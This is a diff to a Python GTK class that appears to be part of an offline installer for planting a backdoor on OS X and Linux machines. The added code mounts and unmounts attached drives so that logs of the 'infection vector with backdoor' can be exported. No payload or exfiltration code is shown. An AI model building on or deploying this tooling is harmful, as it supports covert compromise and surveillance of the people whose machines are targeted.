@@ -24,7 +24,6 @@ class OfflineInstall(object):
 	# General configurations
 	##
 	backconf = None
-	path = None
 
 	#
 	# OS X
@@ -44,6 +43,13 @@ class OfflineInstall(object):
 	crylin = False
 	tablin = None
 	uselin = None
+
+	#
+	# Log export configurations
+	##
+	destdir = None
+	destmnt = "/media/"
+	destdevs = []
 
 	def __init__(self):
 		self.builder = Gtk.Builder()
@@ -142,7 +148,7 @@ class OfflineInstall(object):
 	#
 	# Search partitions of each hard disk device
 	##
-	def check_partitions(self):
+	def check_partitions(self, svalue):
 		devs, hds = self.check_devices()
 		parts = []
 
@@ -158,7 +164,9 @@ class OfflineInstall(object):
 						try:
 							ret = subprocess.call("cryptsetup isLuks /dev/{}".format(j), shell=True)
 							if int(ret) == 0:
-								self.crylin = True
+								if svalue == True:
+									self.crylin = True
+
 								print("  Found: /dev/" + j + ' (Disk is encrypted)')
 							else:
 								print("  Found: /dev/" + j) 
@@ -178,7 +186,7 @@ class OfflineInstall(object):
 	# Search filesystem of each partition of each hard disk device
 	##
 	def check_filesystems(self):
-		parts = self.check_partitions()
+		parts = self.check_partitions(True)
 		fs = ['hfsplus', 'ext4', 'reiserfs', 'ext3', 'ext2', 'xfs', 'jfs']
 		tablefs = []
 	
@@ -1709,6 +1717,121 @@ class OfflineInstall(object):
 		return True
 
 	#
+	# Search and mount all drives for export logs
+	##
+	def mount_devs(self):
+		parts = self.check_partitions(False)
+		fs = ['vfat', 'msdos', 'hfsplus', 'ext4', 'reiserfs', 'ext3', 'ext2', 'xfs', 'jfs']
+
+		print("Check drives on partitions to mount...")
+		
+		if parts == None:
+			self.destdevs = []
+			print("Drives on partitions not found")
+			return
+
+		try:
+			os.mkdir(self.destmnt)
+		except:
+			pass
+
+		for i in parts:
+			try:
+				if subprocess.check_output("mount | grep -i {} | wc -l".format(i), shell=True).decode('utf-8')[:-1] != '0':
+					print("  Skipped: /dev/" + i)
+					continue
+			except:
+				print("  Skipped: /dev/" + i)
+				continue
+
+			if self.tabosx != None:
+				if i[:-1] == self.tabosx['rootdisk'][:-1]:
+					print("  Skipped: /dev/" + i)
+					continue
+			if self.tablin != None:
+				if i[:-1] == (self.tablin['rootdisk'][:-1] or self.tablin['homedisk'][:-1] or self.tablin['vardisk'][:-1]):
+					print("  Skipped: /dev/" + i)
+					continue
+
+			label = None
+
+			try:
+				label = subprocess.check_output("blkid | grep {} | awk '{{print $2}}' | cut -d '\"' -f2".format(i), shell=True).decode('utf-8')[:-1]
+			except:
+				label = i
+
+			mnt = self.destmnt + label
+			os.mkdir(mnt)
+ 
+			for j in fs:
+				try:
+					subprocess.call("mount -t {} /dev/{} {} 2> /dev/null".format(j, i, mnt), shell=True)
+					print("  Found: /dev/" + i + " on mount point " + mnt)
+					self.destdevs.append([i, mnt])
+					break
+				except:
+					pass
+
+		if self.destdevs == []:
+			print("Drives on partitions not found")
+		else:
+			print("Drives on partitions found and mounted")
+			
+	#
+	# Umount all drives mounted first for export logs
+	##
+	def umount_devs(self):
+		print("Check drives on partitions to umount...")
+
+		if self.destdevs == []:
+			print("Drives on partitions not found")
+			return
+
+		for i in self.destdevs:
+			try:
+				if subprocess.check_output("mount | grep -i {} | wc -l".format(i[0]), shell=True).decode('utf-8')[:-1] == '0':
+					print("  Skipped: /dev/" + i[0] + " on mount point " + i[1])
+					try:
+						shutil.rmtree(i[1])
+					except:
+						pass
+					continue
+			except:
+				print("  Skipped: /dev/" + i[0] + " on mount point " + i[1])
+				try:
+					shutil.rmtree(i[1])
+				except:
+					pass
+				continue
+
+			try:
+				subprocess.call("umount {} 2> /dev/null".format(i[1]), shell=True)
+				print("  Found: /dev/" + i[0] + " on mount point " + i[1])			
+				shutil.rmtree(i[1])
+			except:
+				pass
+
+		self.destdevs = []
+		print("Drives on partitions found and umounted")
+
+	#
+	# Show all drives mounted configuration for export logs
+	##
+	def print_mount_devs(self):
+		print("")
+		print("DRIVEs Reports:")
+		print("")
+
+		if self.destdevs == []:
+			print("{")
+			print("  None")
+			print("}")
+		else:
+			print(json.dumps(self.destdevs, indent = 1, sort_keys = True))
+
+		print("")
+
+	#
 	# Export logs of the infection vector with backdoor of the user or users selected
 	##
 	def export_logs(self, *args):
@@ -1729,21 +1852,27 @@ class OfflineInstall(object):
 			response = dialog.run()
 			if response == Gtk.ResponseType.NO:
 				dialog.hide()
+				print("")
 				return
 			elif response == Gtk.ResponseType.YES:
 				dialog.hide()
 
-			self.path = None
+			self.destdir = None
+
+			self.mount_devs()
+			self.print_mount_devs()
 
 			msg = "Select destination directory"
 			dialog = Gtk.FileChooserDialog(msg, self.window, Gtk.FileChooserAction.SELECT_FOLDER, (Gtk.STOCK_CANCEL, Gtk.ResponseType.CANCEL, Gtk.STOCK_OPEN, Gtk.ResponseType.OK))
 			response = dialog.run() 
 
 			if response == Gtk.ResponseType.OK:
-				self.path = dialog.get_filename()
+				self.destdir = dialog.get_filename()
 				dialog.hide()
-			elif response == Gtk.ResponseType.CANCEL or self.path == None:
+			elif response == Gtk.ResponseType.CANCEL:
 				dialog.hide()
+				self.umount_devs()
+				print("")
 
 				dialog = self.builder.get_object("messagedialog10")
 				msgdia = "Destination directory is not valid."
@@ -1753,7 +1882,7 @@ class OfflineInstall(object):
 					dialog.hide()
 					return
 
-			print("Export log to destination directory: " + self.path)
+			print("Export log to destination directory: " + self.destdir)
 
 			for row in rows:
 				iter = model.get_iter(row)
@@ -1784,6 +1913,7 @@ class OfflineInstall(object):
 				if response == Gtk.ResponseType.OK:
 					dialog.hide()
 
+			self.umount_devs()
 			print("")
 			self.check_statususers()
 			self.select_os(None)
